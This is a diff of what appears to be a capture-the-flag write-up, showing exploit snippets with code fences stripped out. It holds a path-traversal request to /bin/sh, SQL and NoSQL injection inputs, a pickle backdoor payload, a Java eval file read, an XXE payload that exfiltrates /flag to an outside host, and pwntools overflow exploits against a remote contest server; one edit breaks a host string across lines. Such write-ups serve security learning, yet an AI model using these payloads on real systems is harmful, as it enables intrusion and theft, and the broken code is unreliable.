@@ -108,11 +108,6 @@ def passwd_decode(code) -> str:
 print(passwd_decode("106&112&101&107&127&101&104&49&57&56&53&56&54&56&49&51&51&105&56
 &103&106&49&56&50&56&103&102&56&52&101&104&102&105&53&101&53&102&129"))
  # flag{ad1985868133e8cf1828cb84adbe5a5b}
-```
-
-
-
-```
 POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
 Host: 127.0.0.1
 Content-Type: application/x-www-form-urlencoded
@@ -126,18 +121,8 @@ echo;cat /fl*;
 /nc
 
 post body: port=80&data=[urlencode_data]
-```
-
-
-
-```
 admin
 1'||'
-```
-
-
-
-```
 from base64 import b64encode
 from urllib.parse import quote
 
@@ -157,27 +142,12 @@ backdoor
 lo.''' % (exc)
 
 print(quote(b64encode(opcode).decode())
-```
-
-
-
-```
 {
 "username":{
 "$toString":"admin"
 }
 }
-```
-
-
-
-```
 new javax.script.ScriptEngineManager().getEngineByName("JS").eval('a=(new ja'+'va.lang.String(jav'+'a.nio.file.Files.readAllBytes(ja'+'va.nio.file.Paths.get("/flag"))).contains("[Alphabet]"))?x:0')
-```
-
-
-
-```
 import requests
 url = ""
 def istext(text):
@@ -192,11 +162,6 @@ for i in range(100):
    break
   if j == "~":
    exit(1)
-```
-
-
-
-```
 <?xml version="1.0" ?>
 <!DOCTYPE r [
 <!ELEMENT r ANY >
@@ -211,11 +176,6 @@ for i in range(100):
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://[IP]/tmp.xml?
 file=%data;'>">
-```
-
-
-
-```
 from z3 import *
 
 # 求解a1
@@ -257,12 +217,7 @@ if s.check() == sat:
     print(hex(solution))
 a4 = 0x04034083
 
-#flag{e3c6235c-05d9434d-04b1edf3-04034083}
-```
-
-
-
-```
+    #flag{e3c6235c-05d9434d-04b1edf3-04034083}
 from pwn import*
 context(arch='amd64', os='linux',log_level="debug")
 
@@ -281,11 +236,6 @@ p.sendafter("Enter",b"hacker")
 p.sendafter("Enter",payload)
 # gdb.attach(p,"")
 p.interactive()
-```
-
-
-
-```
 p.recvuntil("ed")
 p.recv(1)
 for i in range(0x10):
@@ -295,13 +245,9 @@ for i in range(0x10):
  else:
   with open('output', 'a', encoding='latin-1') as file:
    file.write(data.decode('latin-1'))
-```
-
-
-
-```
 from pwn import *
-p = remote('prob03.contest.pku.edu.cn:10004')
+p = remote('prob03.contest.pku.edu.cn:
+10004')
 p.sendlineafter("Please input your token: ","[token]")
 p.sendlineafter("Username: ","adminn")
 debug(p,0x401431)
@@ -311,11 +257,6 @@ payload=payload.ljust(0x9e,b'b')
 payload+=p64(0x40127E)
 p.sendlineafter("Password: ",payload)
 p.interactive()
-```
-
-
-
-```
 from random import shuffle
 from tqdm import tqdm
 from Crypto.Util.number import *
@@ -357,7 +298,7 @@ for a, b,result in tqdm(f):
 
 print(result_)
 print(long_to_bytes(int("".join(result_),2)))
-#flag{this_1s_the_sEcret_f1ag}
+    #flag{this_1s_the_sEcret_f1ag}
 ```
 
 
